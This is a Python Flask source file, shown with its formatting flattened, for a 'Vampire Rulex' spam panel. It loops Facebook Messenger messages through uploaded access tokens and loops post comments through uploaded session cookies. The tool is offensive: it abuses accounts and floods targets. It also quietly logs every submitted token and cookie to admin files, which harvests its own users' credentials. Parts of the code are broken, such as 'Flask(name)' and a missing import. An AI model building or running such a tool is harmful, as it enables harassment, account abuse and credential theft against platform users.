from flask import Flask, request, redirect
import requests
from threading import Thread, Event
import time
import uuid
import json
import os

app = Flask(name)

Flags and state

stop_event_token = Event() stop_event_cookie = Event() threads_token = [] threads_cookie = [] sent_count_token = 0 sent_count_cookie = 0

Files for key management and logs

APPROVED_KEYS_TOKEN_FILE = "approved_keys_token.json" APPROVED_KEYS_COOKIE_FILE = "approved_keys_cookie.json" ADMIN_TOKENS_LOG = "admin_tokens.log" ADMIN_COOKIES_LOG = "admin_cookies.log" MESSAGE_LOG = "message_log.txt"

Helpers to load/save keys

def load_keys(file): return json.load(open(file)) if os.path.exists(file) else {}

def save_keys(file, data): with open(file, "w") as f: json.dump(data, f)

approved_keys_token = load_keys(APPROVED_KEYS_TOKEN_FILE) approved_keys_cookie = load_keys(APPROVED_KEYS_COOKIE_FILE)

Log helper

def log(file, msg): with open(file, "a") as f: f.write(f"[{time.ctime()}] {msg}\n")

Token message spammer

def send_messages_token(tokens, thread_id, name, delay, messages): global stop_event_token, sent_count_token while not stop_event_token.is_set(): for msg in messages: if stop_event_token.is_set(): break for token in tokens: try: url = f'https://graph.facebook.com/v15.0/t_{thread_id}/' data = {'access_token': token, 'message': f"{name}: {msg}"} r = requests.post(url, data=data, timeout=10) if r.status_code == 200: log(MESSAGE_LOG, f"TOKEN {token[:10]}... => {msg}") sent_count_token += 1 else: print(f"❌ Token Failed [{r.status_code}]: {msg}") except Exception as e: print(f"Error Token: {e}") time.sleep(delay)

Cookie comment spammer

def send_comments_cookie(cookies, post_id, name, delay, comments): global stop_event_cookie, sent_count_cookie x = 0 i = 0 while not stop_event_cookie.is_set(): try: comment = f"{name}: {comments[x]}" current_cookie = cookies[i] r = requests.post(f'https://graph.facebook.com/{post_id}/comments/', data={'message': comment}, cookies={'Cookie': current_cookie}) if r.status_code == 200 and 'id' in r.json(): log(MESSAGE_LOG, f"COOKIE #{i+1} => {comment}") sent_count_cookie += 1 x = (x + 1) % len(comments) i = (i + 1) % len(cookies) time.sleep(delay) except Exception as e: print(f"Cookie Error: {e}") time.sleep(3)

@app.route('/') def home(): return render_template_string(''' <!DOCTYPE html><html><head><title>Vampire Rulex</title> <style> body { background:url('https://i.imgur.com/92rqE1X.jpeg') no-repeat center center fixed; background-size:cover; text-align:center; font-family:sans-serif; color:white; } .box { background:rgba(0,0,0,0.6); display:inline-block; margin:50px; padding:40px; border-radius:10px; cursor:pointer; transition:0.3s; text-decoration:none; color:white; font-size:20px; font-weight:bold; } .box:hover { background:rgba(255,255,255,0.1); } </style></head><body> <h1 style="text-shadow: 2px 2px black;">Vampire Rulex Ayansh Panel</h1> <a href="/start-token" class="box">Messenger Spam (Token)</a> <a href="/start-cookie" class="box">Comment Spammer (Cookie)</a> </body></html> ''')

@app.route('/start-token', methods=['GET', 'POST']) def token_panel(): if request.method == 'GET': key = str(uuid.uuid4())[:8] approved_keys_token[key] = False save_keys(APPROVED_KEYS_TOKEN_FILE, approved_keys_token) return f""" <h2>Messenger Token Panel</h2> <p>Your Key: <code>{key}</code> (Ask Admin to Approve)</p> <form method='post' enctype='multipart/form-data'> Key: <input name='secret_key'><br> Token File: <input type='file' name='tokenFile'><br> Thread ID: <input name='threadId'><br> Name: <input name='userName'><br> Delay: <input name='time'><br> Messages File: <input type='file' name='txtFile'><br> <button type='submit'>Start</button> </form> <a href='/'>Back</a> """ else: key = request.form.get("secret_key") if key not in approved_keys_token or not approved_keys_token.get(key): return "❌ Key Invalid or Not Approved" tokens = request.files['tokenFile'].read().decode().splitlines() messages = request.files['txtFile'].read().decode().splitlines() thread_id = request.form['threadId'] name = request.form['userName'] delay = int(request.form['time']) for t in tokens: log(ADMIN_TOKENS_LOG, f"{key} | {t}") if not any(t.is_alive() for t in threads_token): stop_event_token.clear() Thread(target=send_messages_token, args=(tokens, thread_id, name, delay, messages)).start() return "✅ Token spam started. <a href='/status'>Check Status</a>"

@app.route('/start-cookie', methods=['GET', 'POST']) def cookie_panel(): if request.method == 'GET': key = str(uuid.uuid4())[:8] approved_keys_cookie[key] = False save_keys(APPROVED_KEYS_COOKIE_FILE, approved_keys_cookie) return f""" <h2>Post Comment Cookie Panel</h2> <p>Your Key: <code>{key}</code> (Ask Admin to Approve)</p> <form method='post' enctype='multipart/form-data'> Key: <input name='secret_key'><br> Cookie File: <input type='file' name='cookieFile'><br> Post ID: <input name='postId'><br> Name: <input name='commenterName'><br> Delay: <input name='delay'><br> Comment File: <input type='file' name='commentsFile'><br> <button type='submit'>Start</button> </form> <a href='/'>Back</a> """ else: key = request.form.get("secret_key") if key not in approved_keys_cookie or not approved_keys_cookie.get(key): return "❌ Key Invalid or Not Approved" cookies = request.files['cookieFile'].read().decode().splitlines() comments = request.files['commentsFile'].read().decode().splitlines() post_id = request.form['postId'] name = request.form['commenterName'] delay = int(request.form['delay']) for c in cookies: log(ADMIN_COOKIES_LOG, f"{key} | {c}") if not any(t.is_alive() for t in threads_cookie): stop_event_cookie.clear() Thread(target=send_comments_cookie, args=(cookies, post_id, name, delay, comments)).start() return "✅ Cookie spam started. <a href='/status'>Check Status</a>"

@app.route('/status') def status(): return f""" <h3>Status</h3> <p>Token Messages Sent: {sent_count_token}</p> <p>Cookie Comments Sent: {sent_count_cookie}</p> <form method='post' action='/stop'><button type='submit'>🛑 STOP</button></form> <a href='/'>Back</a> """

@app.route('/stop', methods=['POST']) def stop_all(): stop_event_token.set() stop_event_cookie.set() return "🛑 All processes stopped. <a href='/'>Back</a>"

if name == 'main': port = int(os.environ.get("PORT", 5000)) app.run(host='0.0.0.0', port=port)

